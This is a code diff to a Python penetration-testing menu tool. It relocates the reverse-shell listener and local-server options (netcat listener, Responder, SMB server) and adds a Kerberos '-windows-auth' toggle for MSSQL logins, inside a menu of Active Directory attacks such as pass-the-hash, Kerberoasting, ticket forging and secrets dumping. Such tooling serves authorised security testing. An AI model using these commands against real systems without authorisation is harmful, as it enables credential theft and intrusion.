@@ -766,7 +766,12 @@ def dispMenu():
          print(colored(TSH[:COL1],colour7), end=' ')      
       else:
          if(loop == 18): print(colored(TSH[:COL1],colour6), end=' ')
-      if loop == 19 and UN1[:5] == "EMPTY": print (colored(UN1,colour1), end=' ')
+         
+      if loop == 19 and UN1[:5] == "EMPTY":
+         print (colored(UN1,colour7), end=' ')
+      else:
+         if loop == 19: print (colored(UN1[:COL1],colour6), end=' ')      
+      
       if loop == 20 and UN2[:5] == "EMPTY": print (colored(UN2,colour1), end=' ')      
       if loop == 21 and UN3[:5] == "EMPTY": print (colored(UN3,colour1), end=' ')
       if loop == 22 and UN4[:5] == "EMPTY": print (colored(UN4,colour1), end=' ')
@@ -817,12 +822,12 @@ def options():
    print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Silv Ticket (72) VulnScanner (82) GRP  SHARES (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Enum  DOMAIN (601) LAPS    Dumper (701) Certipy ESC1 (711) Certipy   ESC11  " + '\u2551')      
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Gold Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Recon DOMAIN (602) Secrets   Dump (702) Certipy ESC2 (712) Certipy   ESC12  " + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Gold DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Enum Sub-DOM (603) Crack-Map-Dump (703) Certipy ESC3 (713) Certify   ESC13  " + '\u2551')
-   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) EnumVirtHOST (604) Domain    Dumo (704) Certipy ESC4 (714) Certify   ESC14  " + '\u2551')
-   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) TARGDRoasting (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodHoundDump (705) Certipy ESC5 (715) Certify   ESC15  " + '\u2551')
+   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Tog KerberosAuth (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) EnumVirtHOST (604) Domain    Dumo (704) Certipy ESC4 (714) Certify   ESC14  " + '\u2551')
+   print('\u2551' + "(06) Re/Set USER   NAME (16)                  (36) PS  Exec (46) Rpc ClientServ (56) TARGDRoasting (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodHoundDump (705) Certipy ESC5 (715) Certify   ESC15  " + '\u2551')
    print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set SERV TIME (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADd User (706) Certipy ESC6 (716) Certify   ESC16  " + '\u2551')
    print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) BloodyADdGroup (707) Certipy ESC7 (717) Certify   ESC17  " + '\u2551')
-   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608) ReactivateUser (708) Certipy ESC8 (718) BloodHound  GUI  " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux    (70)             (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240) RunLineCommand  (350) LFI     Wordlist (450)", end= ' ')
+   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69) Set Servers (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608) ReactivateUser (708) Certipy ESC8 (718) BloodHound  GUI  " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux    (70) SetRevShell (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240) RunLineCommand  (350) LFI     Wordlist (450)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ')
    else:
@@ -1064,7 +1069,7 @@ CSP = "UNKNOWN                                 "
 XOP = "UNKNOWN                                 "
 CON = "UNKNOWN                                 "
 SDM = "EMPTY                                   "
-UN1 = "EMPTY                                   "
+UN1 = "-windows-auth                           "
 UN2 = "EMPTY                                   "
 UN3 = "EMPTY                                   "
 UN4 = "EMPTY                                   "
@@ -1111,7 +1116,7 @@ coloum_one_Labels[15] = "DOMAIN  SID"
 coloum_one_Labels[16] = "SUB  DOMAIN"
 coloum_one_Labels[17] = "FILE   NAME"
 coloum_one_Labels[18] = "SHARE  NAME"
-coloum_one_Labels[19] = "UNALLOCATED"
+coloum_one_Labels[19] = "KERBEROS   "
 coloum_one_Labels[20] = "UNALLOCATED"
 coloum_one_Labels[21] = "UNALLOCATED"
 coloum_one_Labels[22] = "UNALLOCATED"
@@ -1178,10 +1183,10 @@ SID = linecache.getline("ascii.tmp", 18).rstrip("\n")
 SDM = linecache.getline("ascii.tmp", 19).rstrip("\n")
 FIL = linecache.getline("ascii.tmp", 20).rstrip("\n")
 TSH = linecache.getline("ascii.tmp", 21).rstrip("\n")
-UN1 = linecache.getline("ascii.tmp", 22).rstrip("\n")
-UN2 = linecache.getline("ascii.tmp", 23).rstrip("\n")
-UN3 = linecache.getline("ascii.tmp", 24).rstrip("\n")
-UN4 = linecache.getline("ascii.tmp", 25).rstrip("\n")
+# UN1 = linecache.getline("ascii.tmp", 22).rstrip("\n")
+# UN2 = linecache.getline("ascii.tmp", 23).rstrip("\n")
+# UN3 = linecache.getline("ascii.tmp", 24).rstrip("\n")
+#  UN4 = linecache.getline("ascii.tmp", 25).rstrip("\n")
 if USR.rstrip(" ") == "":
    USR = "\'\'"   
 if PAS.rstrip(" ") == '':
@@ -1730,83 +1735,23 @@ while True:
       else:
          TSH = BAK
       prompt()    
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Start HTTP servers
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '15':
-      dispSubMenu(" (01) HTTP Server (02) SMB Server (03) PHP Server (04) RUBY Server (05) SMTPD Server (06) NCAT Server (07) Responder (08) Quit")
-      checkParam = 0
-      subChoice = input("[?] Please select an option: ")
-      if subChoice == "1":
-         HTTP = input("[?] Please select a port value: ")
-         if HTTP.isnumeric():
-            choice = "python3 -m http.server --bind " + localIP + " " + HTTP
-            checkParam = 1
-      if subChoice == "2":
-         choice = "impacket-smbserver " + workDir + " ./" + workDir + " -smb2support"
-         checkParam = 1
-      if subChoice == "3":
-         HTTP = input("[?] Please select a port value: ")
-         if HTTP.isnumeric():
-            choice = "php -S " + localIP + ":" + HTTP    
-            checkParam = 1
-      if subChoice == "4":
-         HTTP = input("[?] Please select a port value: ")
-         if HTTP.isnumeric():
-            choice = "ruby -run -e httpd . -p " + HTTP
-            checkParam = 1
-      if subChoice == "5":
-         HTTP = input("[?] Please select a port value: ")
-         if HTTP.isnumeric():
-            choice = "python3  /usr/lib/python3.9/smtpd.py -n -c DebuggingServer " + localIP + ":" + HTTP
-            checkParam = 1
-      if subChoice == "6":
-         HTTP = input("[?] Please select a port value: ")
-         choice = "rlwrap nc -nvlp " + HTTP
-         checkParam = 1
-      if subChoice == "7":
-         choice = "responder -I " + netWork + " -w On -r ONn -f On -v"
-         checkParam = 1
-      if subChoice == "8":
-         pass
-      if checkParam != 0:
-        if HTTP != "":
-            print(colored("[*] Specified local service started...", colour3))
-            localCOM("xdotool key Ctrl+Shift+T")
-            localCOM("xdotool key Alt+Shift+S; xdotool type 'LOCAL SERVICE'; xdotool key Return")
-            dispBanner("LOCAL SERVICE",0) 
-            localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-            localCOM("xdotool type '" + choice + "'; xdotool key Return")
-            localCOM("xdotool key Ctrl+Tab")         
-      prompt()    
+      
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Start a Reverse Shell
+# Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '16':
-      portChoice = input("[?] Please select a port number: ")
-      if portChoice.isnumeric():
-         print(colored("[*] Specified local service started...", colour3))
-         localCOM("xdotool key Ctrl+Shift+T")
-         localCOM("xdotool key Alt+Shift+S; xdotool type 'REVERSE SHELL'; xdotool key Return")
-         dispBanner("REVERSE SHELL",0) 
-         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-         localCOM("xdotool type 'python3 ./" + explDir + "/shell.py '" + portChoice + "; xdotool key Return")
-         localCOM("xdotool key Ctrl+Tab")
+   if selection == '15':
+      print("[+] Toggling kerberos auth type...")
+      if UN1[:13] == "-windows-auth":
+         UN1 = spacePadding(" ",COL1)
       else:
-         pass
-      prompt() 
+         UN1 = spacePadding("-windows-auth",COL1)   
+      prompt()   
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2959,17 +2904,83 @@ while True:
          print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n", colour3))
          remoteCOM(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Start HTTP servers
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '69':
+      dispSubMenu(" (01) HTTP Server (02) SMB Server (03) PHP Server (04) RUBY Server (05) SMTPD Server (06) NCAT Server (07) Responder (08) Quit")
+      checkParam = 0
+      subChoice = input("[?] Please select an option: ")
+      if subChoice == "1":
+         HTTP = input("[?] Please select a port value: ")
+         if HTTP.isnumeric():
+            choice = "python3 -m http.server --bind " + localIP + " " + HTTP
+            checkParam = 1
+      if subChoice == "2":
+         choice = "impacket-smbserver " + workDir + " ./" + workDir + " -smb2support"
+         checkParam = 1
+      if subChoice == "3":
+         HTTP = input("[?] Please select a port value: ")
+         if HTTP.isnumeric():
+            choice = "php -S " + localIP + ":" + HTTP    
+            checkParam = 1
+      if subChoice == "4":
+         HTTP = input("[?] Please select a port value: ")
+         if HTTP.isnumeric():
+            choice = "ruby -run -e httpd . -p " + HTTP
+            checkParam = 1
+      if subChoice == "5":
+         HTTP = input("[?] Please select a port value: ")
+         if HTTP.isnumeric():
+            choice = "python3  /usr/lib/python3.9/smtpd.py -n -c DebuggingServer " + localIP + ":" + HTTP
+            checkParam = 1
+      if subChoice == "6":
+         HTTP = input("[?] Please select a port value: ")
+         choice = "rlwrap nc -nvlp " + HTTP
+         checkParam = 1
+      if subChoice == "7":
+         choice = "responder -I " + netWork + " -w On -r ONn -f On -v"
+         checkParam = 1
+      if subChoice == "8":
+         pass
+      if checkParam != 0:
+        if HTTP != "":
+            print(colored("[*] Specified local service started...", colour3))
+            localCOM("xdotool key Ctrl+Shift+T")
+            localCOM("xdotool key Alt+Shift+S; xdotool type 'LOCAL SERVICE'; xdotool key Return")
+            dispBanner("LOCAL SERVICE",0) 
+            localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+            localCOM("xdotool type '" + choice + "'; xdotool key Return")
+            localCOM("xdotool key Ctrl+Tab")         
+      prompt()    
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - Start a Reverse Shell
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='70':    
-      prompt()
+   if selection == '70':
+      portChoice = input("[?] Please select a port number: ")
+      if portChoice.isnumeric():
+         print(colored("[*] Specified local service started...", colour3))
+         localCOM("xdotool key Ctrl+Shift+T")
+         localCOM("xdotool key Alt+Shift+S; xdotool type 'REVERSE SHELL'; xdotool key Return")
+         dispBanner("REVERSE SHELL",0) 
+         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+         localCOM("xdotool type 'python3 ./" + explDir + "/shell.py '" + portChoice + "; xdotool key Return")
+         localCOM("xdotool key Ctrl+Tab")
+      else:
+         pass
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3732,11 +3743,11 @@ while True:
          checkParam = test_PRT("1433")               
       if checkParam != 1:
          if PAS[:1] != " ":
-            remoteCOM(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " -windows-auth")
+            remoteCOM(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + UN1.rstrip(" "))
          else:
             if NTM[:1] != " ":
                print("[i] Using HASH value as password credential...")
-               remoteCOM(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes " + NTM.rstrip(" ") + " -windows-auth")
+               remoteCOM(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes " + NTM.rstrip(" ") + UN1.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
